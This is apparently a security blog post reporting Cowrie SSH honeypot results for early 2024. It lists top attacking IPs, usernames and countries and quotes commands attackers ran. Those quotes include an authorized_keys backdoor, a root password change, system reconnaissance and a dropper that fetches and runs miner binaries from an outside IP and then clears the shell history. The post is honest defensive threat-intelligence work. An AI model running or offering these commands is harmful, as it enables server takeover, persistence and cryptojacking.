---
title: Bruteforce Attacks Q1 2024
description: >-
  In the first months of 2024 I have set up a cowrie honeypot to see what is new in 2024 😄
author: iacob
date: 2024-07-30
categories: [InfoSec, Statistics]
tags: [cowrie, ssh, attack, bruteforce]
pin: true
---

| Top 10 IP Addresses | Top 10 Usernames | Top 10 Countries           |
|---------------------|------------------|----------------------------|
| 185.251.91.121      | root             | China                      |
| 101.35.132.221      | 345gs5662d34     | United States of America   |
| 52.148.221.37       | test             | Russian Federation         |
| 129.146.4.225       | guest            | Hong Kong                  |
| 139.59.252.180      | admin            | Germany                    |
| 77.85.216.134       | user             | Netherlands                |
| 210.3.147.162       | oracle           | Korea (Republic of)        |
| 106.248.231.67      | hadoop           | Singapore                  |
| 190.114.253.211     | es               | Bulgaria                   |
| 1.14.46.198         | hmsftp           | Chile                      |

---

The main attacker `185.251.91.121` has tried to bruteforce the honeypot for **OVER** 1.000 times, while the others ones falling behind at only 400 times and decending.

---

## Some interesting commands

---



#### Backdoor Attempt

Here there was an attempt at a backdoor

> cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3Nza[...]KPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~","message":"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAA[...]+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~


Followed by a `chattr` command to assure the file won't be modified further


> cd ~; chattr -ia .ssh; lockr -ia .ssh","message":"CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh


#### System Inspection


Display the size of the filesystem
> df -h \| head -n 2 \| awk 'FNR == 2 {print $2;}'

Get CPU model - relevant to gauge the power (maybe cryptomining)
> lscpu \| grep Model

Get the CPU cores
> cat /proc/cpuinfo \| grep model \| grep name \| wc 

Get RAM information
> free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'

Taking over root account via password change
> echo \"root:bFUDiMA8REPQ\"|chpasswd|bash"

#### Crypto mining

Checking for existing cryptominers
> ps -ef | grep '[Mm]iner'

Autodownload miners and execution
> #!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c; 


